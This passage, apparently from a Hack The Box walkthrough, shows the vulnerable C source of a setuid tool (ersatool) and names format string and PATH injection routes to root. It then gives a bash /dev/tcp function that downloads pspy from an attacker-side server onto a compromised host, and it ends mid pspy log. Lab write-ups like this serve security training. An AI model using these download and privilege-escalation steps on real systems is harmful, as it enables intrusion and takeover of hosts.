class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include </span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;libgen.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;ctype.h&gt;</span></span><br><span class="line"></span><br><span class="line">//easyrsa configuration</span><br><span class="line">char ERSA_DIR[]=<span class="string">&quot;/opt/easyrsa&quot;</span>;</span><br><span class="line">char TA_KEY[]=<span class="string">&quot;/opt/easyrsa/clients/ta.key&quot;</span>;</span><br><span class="line">char OUTPUT_DIR[]=<span class="string">&quot;/opt/easyrsa/clients&quot;</span>;</span><br><span class="line">char BASE_CONFIG[]=<span class="string">&quot;/opt/easyrsa/clients/base.conf&quot;</span>;</span><br><span class="line">char EXT[]=<span class="string">&quot;.ovpn&quot;</span>;</span><br><span class="line"></span><br><span class="line">//void printCN(char*,int);</span><br><span class="line">void filePrint(char*);</span><br><span class="line">void revokeCN(char*,int);</span><br><span class="line">void createCN(char*,int);</span><br><span class="line">void integrateCN(char*);</span><br><span class="line">void getHelp(char*,int);</span><br><span class="line">void cleanStr(char*);</span><br><span class="line"></span><br><span class="line">//deprecated <span class="keyword">function</span> - prints the CN ovpn config file</span><br><span class="line">//conf file can be printed with inegrateCN(); &lt;- create</span><br><span class="line">void printCN(char *cn, int i)&#123;</span><br><span class="line">        char fn[100];</span><br><span class="line">        char buffer[100];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(i==1)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;print-&gt;CN=&quot;</span>);</span><br><span class="line">                fflush(stdout);</span><br><span class="line">                memset(buffer,0,sizeof(buffer));</span><br><span class="line">                <span class="built_in">read</span>(0,buffer,sizeof(buffer));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                memset(buffer,0,sizeof(buffer));</span><br><span class="line">                strncat(buffer,cn,sizeof(buffer));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!strncmp(<span class="string">&quot;\n&quot;</span>,buffer,1)) &#123; <span class="built_in">return</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">                strncpy(fn, OUTPUT_DIR,sizeof(fn));</span><br><span class="line">                strncat(fn, <span class="string">&quot;/&quot;</span>,sizeof(fn)-strlen(fn));</span><br><span class="line">                strncat(fn, strtok(<span class="built_in">basename</span>(buffer),<span class="string">&quot;\n&quot;</span>),sizeof(fn)-strlen(fn));</span><br><span class="line">                strncat(fn, EXT, sizeof(fn)-strlen(fn));</span><br><span class="line">                <span class="built_in">printf</span>(buffer); //checking buffer content</span><br><span class="line">                filePrint(fn);</span><br><span class="line">                <span class="keyword">if</span>(i==1)&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;\nprint-&gt;CN=&quot;</span>);</span><br><span class="line">                        fflush(stdout);</span><br><span class="line">                        memset(buffer,0,sizeof(buffer));</span><br><span class="line">                        <span class="built_in">read</span>(0,buffer,sizeof(buffer));</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (strncmp(<span class="string">&quot;\n&quot;</span>,buffer,1) &amp;&amp; i==1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void filePrint(char *filename)&#123;</span><br><span class="line">        int bfsiz=1;</span><br><span class="line">        char buffer[bfsiz];</span><br><span class="line">        int fd;</span><br><span class="line">        ssize_t fr;</span><br><span class="line">        memset(buffer,0,bfsiz);</span><br><span class="line">        setuid(0); //escalating privileges to <span class="built_in">read</span> root owned files</span><br><span class="line">        <span class="keyword">if</span>((fd=open(filename,O_RDONLY))&lt;0)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[!] ERR reading %s!\n&quot;</span>,filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fr=<span class="built_in">read</span>(fd,buffer,bfsiz)&gt;0)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buffer);</span><br><span class="line">                memset(buffer,0,bfsiz);</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void revokeCN(char *cn, int i)&#123;</span><br><span class="line">        puts(<span class="string">&quot;[!] Not implemented&quot;</span>);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//creates and prints new CN config file</span><br><span class="line">void createCN(char *cn, int i)&#123;</span><br><span class="line">        int devNull, sout, serr, pid, status, oid;</span><br><span class="line">        char EASYRSA[50];</span><br><span class="line">        char buffer[100];</span><br><span class="line">        char CMD[100];</span><br><span class="line">        char WD[50];</span><br><span class="line"></span><br><span class="line">        memset(EASYRSA,0,sizeof(EASYRSA));</span><br><span class="line">        strcat(EASYRSA,ERSA_DIR);</span><br><span class="line">        strcat(EASYRSA,<span class="string">&quot;/easyrsa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(i==1)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;create-&gt;CN=&quot;</span>);</span><br><span class="line">                fflush(stdout);</span><br><span class="line">                memset(buffer,0,sizeof(buffer));</span><br><span class="line">                <span class="built_in">read</span>(0,buffer,sizeof(buffer));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                memset(buffer,0,sizeof(buffer));</span><br><span class="line">                strncat(buffer, cn, sizeof(buffer));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!strncmp(<span class="string">&quot;\n&quot;</span>,buffer,1)) &#123; <span class="built_in">return</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">                pid = vfork();</span><br><span class="line">                <span class="keyword">if</span>(pid==0)&#123;</span><br><span class="line">                        char *a[] = &#123;EASYRSA,<span class="string">&quot;build-client-full&quot;</span>,strtok(<span class="built_in">basename</span>(buffer),<span class="string">&quot;\n&quot;</span>),<span class="string">&quot;nopass&quot;</span>,<span class="string">&quot;batch&quot;</span>&#125;;</span><br><span class="line">                        //forge the <span class="built_in">command</span> string</span><br><span class="line">                        cleanStr(a[2]);</span><br><span class="line">                        sprintf(CMD,<span class="string">&quot;%s %s %.20s %s %s&quot;</span>,a[0],a[1],a[2],a[3],a[4]);</span><br><span class="line">                        sout=dup(STDOUT_FILENO);</span><br><span class="line">                        serr=dup(STDERR_FILENO);</span><br><span class="line">                        devNull=open(<span class="string">&quot;/dev/null&quot;</span>,O_WRONLY);</span><br><span class="line">                        dup2(devNull,STDOUT_FILENO);</span><br><span class="line">                        dup2(devNull,STDERR_FILENO);</span><br><span class="line">                        setuid(0); //escalating privilges to generate required files</span><br><span class="line">                        <span class="built_in">chdir</span>(ERSA_DIR);</span><br><span class="line">                        system(CMD);</span><br><span class="line">                        <span class="built_in">exit</span>(0);</span><br><span class="line">                &#125;</span><br><span class="line">                dup2(sout,STDOUT_FILENO);</span><br><span class="line">                dup2(serr,STDERR_FILENO);</span><br><span class="line">                close(devNull);</span><br><span class="line">                usleep(500000);</span><br><span class="line">                integrateCN(buffer);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(i==1)&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;create-&gt;CN=&quot;</span>);</span><br><span class="line">                        fflush(stdout);</span><br><span class="line">                        memset(buffer,0,sizeof(buffer));</span><br><span class="line">                        <span class="built_in">read</span>(0,buffer,sizeof(buffer));</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (strncmp(<span class="string">&quot;\n&quot;</span>,buffer,1) &amp;&amp; i==1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//print valid ovpnfile <span class="keyword">for</span> provided cn</span><br><span class="line">void integrateCN(char *cn)&#123;</span><br><span class="line">        char PKI_DIR[50];</span><br><span class="line">        char KEY_DIR[50];</span><br><span class="line">        char CRT_DIR[50];</span><br><span class="line">        char CA_CERT[50];</span><br><span class="line">        char CN_CERT[50];</span><br><span class="line">        char CN_KEY[50];</span><br><span class="line"></span><br><span class="line">        memset(PKI_DIR,0,sizeof(PKI_DIR));</span><br><span class="line">        memset(KEY_DIR,0,sizeof(KEY_DIR));</span><br><span class="line">        memset(CRT_DIR,0,sizeof(CRT_DIR));</span><br><span class="line">        memset(CA_CERT,0,sizeof(CA_CERT));</span><br><span class="line">        memset(CN_CERT,0,sizeof(CN_CERT));</span><br><span class="line">        memset(CN_KEY,0,sizeof(CN_KEY));</span><br><span class="line"></span><br><span class="line">        strcat(PKI_DIR,ERSA_DIR);</span><br><span class="line">        strcat(PKI_DIR,<span class="string">&quot;/pki&quot;</span>);</span><br><span class="line">        strcat(KEY_DIR,PKI_DIR);</span><br><span class="line">        strcat(KEY_DIR,<span class="string">&quot;/private&quot;</span>);</span><br><span class="line">        strcat(CRT_DIR,PKI_DIR);</span><br><span class="line">        strcat(CRT_DIR,<span class="string">&quot;/issued&quot;</span>);</span><br><span class="line">        strcat(CA_CERT,PKI_DIR);</span><br><span class="line">        strcat(CA_CERT,<span class="string">&quot;/ca.crt&quot;</span>);</span><br><span class="line">        strcat(CN_CERT,CRT_DIR);</span><br><span class="line">        strcat(CN_CERT,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        strcat(CN_CERT,<span class="built_in">basename</span>(cn));</span><br><span class="line">        strcat(CN_CERT,<span class="string">&quot;.crt&quot;</span>);</span><br><span class="line">        strcat(CN_KEY,KEY_DIR);</span><br><span class="line">        strcat(CN_KEY,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        strcat(CN_KEY,<span class="built_in">basename</span>(cn));</span><br><span class="line">        strcat(CN_KEY,<span class="string">&quot;.key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        filePrint(BASE_CONFIG);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&lt;ca&gt;\n&quot;</span>);</span><br><span class="line">        filePrint(CA_CERT);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&lt;/ca&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&lt;cert&gt;\n&quot;</span>);</span><br><span class="line">        filePrint(CN_CERT);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&lt;/cert&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&lt;key&gt;\n&quot;</span>);</span><br><span class="line">        filePrint(CN_KEY);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&lt;/key&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key-direction 1\n&lt;tls-auth&gt;\n&quot;</span>);</span><br><span class="line">        filePrint(TA_KEY);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&lt;/tls-auth&gt;\n&quot;</span>);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void getHelp(char *prog, int i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==1) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;create|print|revoke|exit\n&quot;</span>);</span><br><span class="line">                fflush(stdout);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;batch mode: %s create|print|revoke CN\n&quot;</span>,prog);</span><br><span class="line">                fflush(stdout);</span><br><span class="line">                <span class="built_in">exit</span>(255);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//clean non alphanum chars from string to secure</span><br><span class="line">void cleanStr(char *str)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned long i = 0;</span><br><span class="line">    unsigned long j = 0;</span><br><span class="line">    char c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((c = str[i++]) != &#x27;\<span class="number">0</span>&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (isalnum(c))</span><br><span class="line">        &#123;</span><br><span class="line">            str[j++] = c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    str[j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">        int interactive=0;</span><br><span class="line">        char opt[8];</span><br><span class="line">        char *cn;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(argc!=3 &amp;&amp; argc!=1)&#123;</span><br><span class="line">                getHelp(argv[0],interactive);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(argc==1)&#123;</span><br><span class="line">                interactive=1;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">                fflush(stdout);</span><br><span class="line">                memset(opt,0,sizeof(opt));</span><br><span class="line">                <span class="built_in">read</span>(0,opt,sizeof(opt));</span><br><span class="line">                cn=NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                strncpy(opt,argv[1],sizeof(opt));</span><br><span class="line">                cn=argv[2];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span>      &#123;</span><br><span class="line">                <span class="keyword">if</span>(!strncmp(<span class="string">&quot;revoke&quot;</span>,opt,6))&#123;</span><br><span class="line">                        revokeCN(cn,interactive);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (!strncmp(<span class="string">&quot;print&quot;</span>,opt,5))&#123;</span><br><span class="line">                        printCN(cn,interactive);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (!strncmp(<span class="string">&quot;create&quot;</span>,opt,6))&#123;</span><br><span class="line">                        createCN(cn,interactive);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (!strncmp(<span class="string">&quot;exit&quot;</span>,opt,4))&#123;</span><br><span class="line">                        <span class="built_in">exit</span>(0);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                        getHelp(argv[0], interactive);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(interactive==1)&#123;</span><br><span class="line">                        memset(opt,0,sizeof(opt));</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">                        fflush(stdout);</span><br><span class="line">                        memset(opt,0,sizeof(opt));</span><br><span class="line">                        <span class="built_in">read</span>(0,opt,sizeof(opt));</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span>(interactive==1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So we have two methods for geeting root</p>
<ol>
<li>using format string vulnerability</li>
<li>path injection</li>
</ol>
<p>So i use path injection for doing that.</p>
<p>So let’s monitor the calls of binary with pspy but the problem is how do we transfer that pspy binary on that machiene because there is no curl and wget or nothing for that.</p>
<p>But i found a way to transfer pspy into machiene by help of this article.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly91bml4LnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy84MzkyNi9ob3ctdG8tZG93bmxvYWQtYS1maWxlLXVzaW5nLWp1c3QtYmFzaC1hbmQtbm90aGluZy1lbHNlLW5vLWN1cmwtd2dldC1wZXJsLWV0">how to download a file using just bash and nothing else<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>With the help of this bash script i will transfer that pspy binary.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">__curl</span></span>() &#123;</span><br><span class="line">  <span class="built_in">read</span> proto server path &lt;&lt;&lt;$(<span class="built_in">echo</span> <span class="variable">$&#123;1//// &#125;</span>)</span><br><span class="line">  DOC=/<span class="variable">$&#123;path// //&#125;</span></span><br><span class="line">  HOST=<span class="variable">$&#123;server//:*&#125;</span></span><br><span class="line">  PORT=<span class="variable">$&#123;server//*:&#125;</span></span><br><span class="line">  [[ x<span class="string">&quot;<span class="variable">$&#123;HOST&#125;</span>&quot;</span> == x<span class="string">&quot;<span class="variable">$&#123;PORT&#125;</span>&quot;</span> ]] &amp;&amp; PORT=80</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/<span class="variable">$&#123;HOST&#125;</span>/<span class="variable">$PORT</span></span><br><span class="line">  <span class="built_in">echo</span> -en <span class="string">&quot;GET <span class="variable">$&#123;DOC&#125;</span> HTTP/1.0\r\nHost: <span class="variable">$&#123;HOST&#125;</span>\r\n\r\n&quot;</span> &gt;&amp;3</span><br><span class="line">  (<span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span></span><br><span class="line">   [[ <span class="string">&quot;<span class="variable">$line</span>&quot;</span> == $<span class="string">&#x27;\r&#x27;</span> ]] &amp;&amp; <span class="built_in">break</span></span><br><span class="line">  <span class="keyword">done</span> &amp;&amp; <span class="built_in">cat</span>) &lt;&amp;3</span><br><span class="line">  <span class="built_in">exec</span> 3&gt;&amp;-</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h4><p>First thing first let’s download the pspy binary.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RvbWluaWNCcmV1a2VyL3BzcHkvcmVsZWFzZXMvZG93bmxvYWQvdjEuMi4wL3BzcHk2NHM=">pspy64s<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h4 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h4><p>Then transfer the pspy binary into www-data with scp.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 -i id_rsa_www-data pspy64s www-data@10.10.10.246:/tmp/pspy</span><br></pre></td></tr></table></figure>

<h4 id="Step-3-1"><a href="#Step-3-1" class="headerlink" title="Step 3"></a>Step 3</h4><p>Start the python3 server on the &#x2F;tmp directory.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@web:/tmp$ python3 -m http.server 1337</span><br><span class="line">Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...</span><br></pre></td></tr></table></figure>

<h4 id="Step-4-1"><a href="#Step-4-1" class="headerlink" title="Step 4"></a>Step 4</h4><p>Follow the steps again to get the second shell with luci.py because we want two shells first is for running pspy second is for running ersatool binary.</p>
<p>After everything ready go to the shell which we get from luci.py and paste the whole script on terminal.</p>
<ol>
<li>go to &#x2F;tmp directory</li>
<li>create a directory www</li>
<li>paste the whole code which we get from stackoverflow</li>
<li>then call the function with __curl</li>
<li>and download the file inside &#x2F;tmp&#x2F;www directory</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">www-data@pki:~/html$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@pki:/tmp$ <span class="built_in">mkdir</span> www</span><br><span class="line"><span class="built_in">mkdir</span> www</span><br><span class="line">www-data@pki:/tmp$ <span class="built_in">cd</span> www</span><br><span class="line"><span class="built_in">cd</span> www</span><br><span class="line">www-data@pki:/tmp/www$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">www-data@pki:/tmp/www$ <span class="keyword">function</span> <span class="function"><span class="title">__curl</span></span>() &#123;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">__curl</span></span>() &#123;</span><br><span class="line">&gt;   <span class="built_in">read</span> proto server path &lt;&lt;&lt;$(<span class="built_in">echo</span> <span class="variable">$&#123;1//// &#125;</span>)</span><br><span class="line">  DOC=/<span class="variable">$&#123;path// //&#125;</span></span><br><span class="line">  HOST=<span class="variable">$&#123;server//:*&#125;</span></span><br><span class="line">  PORT=<span class="variable">$&#123;server//*:&#125;</span></span><br><span class="line">  [[ x<span class="string">&quot;<span class="variable">$&#123;HOST&#125;</span>&quot;</span> == x<span class="string">&quot;<span class="variable">$&#123;PORT&#125;</span>&quot;</span> ]] &amp;&amp; PORT=80</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/<span class="variable">$&#123;HOST&#125;</span>/<span class="variable">$PORT</span></span><br><span class="line">  <span class="built_in">echo</span> -en <span class="string">&quot;GET <span class="variable">$&#123;DOC&#125;</span> HTTP/1.0\r\nHost: <span class="variable">$&#123;HOST&#125;</span>\r\n\r\n&quot;</span> &gt;&amp;3</span><br><span class="line">  (<span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span></span><br><span class="line">   [[ <span class="string">&quot;<span class="variable">$line</span>&quot;</span> == $<span class="string">&#x27;\r&#x27;</span> ]] &amp;&amp; <span class="built_in">break</span></span><br><span class="line">  <span class="keyword">done</span> &amp;&amp; <span class="built_in">cat</span>) &lt;&amp;3</span><br><span class="line">  <span class="built_in">exec</span> 3&gt;&amp;-</span><br><span class="line">&#125;  <span class="built_in">read</span> proto server path &lt;&lt;&lt;$(<span class="built_in">echo</span> <span class="variable">$&#123;1//// &#125;</span>)</span><br><span class="line">&gt;   DOC=/<span class="variable">$&#123;path// //&#125;</span></span><br><span class="line">&gt;   HOST=<span class="variable">$&#123;server//:*&#125;</span></span><br><span class="line">&gt;   PORT=<span class="variable">$&#123;server//*:&#125;</span></span><br><span class="line">&gt;   [[ x<span class="string">&quot;<span class="variable">$&#123;HOST&#125;</span>&quot;</span> == x<span class="string">&quot;<span class="variable">$&#123;PORT&#125;</span>&quot;</span> ]] &amp;&amp; PORT=80</span><br><span class="line">&gt; </span><br><span class="line">&gt;   <span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/<span class="variable">$&#123;HOST&#125;</span>/<span class="variable">$PORT</span></span><br><span class="line">&gt;   <span class="built_in">echo</span> -en <span class="string">&quot;GET <span class="variable">$&#123;DOC&#125;</span> HTTP/1.0\r\nHost: <span class="variable">$&#123;HOST&#125;</span>\r\n\r\n&quot;</span> &gt;&amp;3</span><br><span class="line">&gt;   (<span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span></span><br><span class="line">&gt;    [[ <span class="string">&quot;<span class="variable">$line</span>&quot;</span> == $<span class="string">&#x27;\r&#x27;</span> ]] &amp;&amp; <span class="built_in">break</span></span><br><span class="line">&gt;   <span class="keyword">done</span> &amp;&amp; <span class="built_in">cat</span>) &lt;&amp;3</span><br><span class="line">&gt;   <span class="built_in">exec</span> 3&gt;&amp;-</span><br><span class="line">&gt; </span><br><span class="line">&#125;</span><br><span class="line">www-data@pki:/tmp/www$ __curl http://192.168.254.2:1337/pspy &gt; pspy</span><br><span class="line">__curl http://192.168.254.2:1337/pspy &gt; pspy</span><br><span class="line">www-data@pki:/tmp/www$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 1140</span><br><span class="line">drwxr-xr-x 2 www-data www-data    4096 Jun 26 11:44 .</span><br><span class="line">drwxrwxrwt 1 root     root        4096 Jun 26 11:44 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1156536 Jun 26 11:44 pspy</span><br><span class="line">www-data@pki:/tmp/www$</span><br></pre></td></tr></table></figure>

<p>Now after transferring pspy run that on first rev shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@pki:/tmp/www$ <span class="built_in">chmod</span> +x pspy</span><br><span class="line"><span class="built_in">chmod</span> +x pspy</span><br><span class="line">www-data@pki:/tmp/www$ ./pspy | <span class="built_in">tee</span> <span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>Now on second rev shell run that ersatool binary.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ersatool</span><br><span class="line">create</span><br><span class="line">a</span><br><span class="line"><span class="built_in">print</span></span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>And i capture all calls of the binary and i found that openssl was call without giving the full path.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1977   | openssl version </span><br><span class="line">2021/06/26 11:49:27 CMD: UID=0    PID=1978   | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`<span class="variable">$dir</span>`/opt/easyrsa/pki`g -e s`<span class="variable">$EASYRSA_PKI</span>`/opt/easyrsa/pki`g -e s`<span class="variable">$EASYRSA_CERT_EXPIRE</span>`36500`g -e s`<span class="variable">$EASYRSA_CRL_DAYS</span>`180`g -e s`<span class="variable">$EASYRSA_DIGEST</span>`sha256`g -e s`<span class="variable">$EASYRSA_KEY_SIZE</span>`2048`g -e s`<span class="variable">$EASYRSA_DIGEST</span>`sha256`g -e s`<span class="variable">$EASYRSA_DN</span>`cn_only`g -e s`<span class="variable">$EASYRSA_REQ_COUNTRY</span>`US`g -e s`<span class="variable">$EASYRSA_REQ_PROVINCE</span>`California`g -e s`<span class="variable">$EASYRSA_REQ_CITY</span>`San Francisco`g -e s`<span class="variable">$EASYRSA_REQ_ORG</span>`Copyleft Certificate Co`g -e 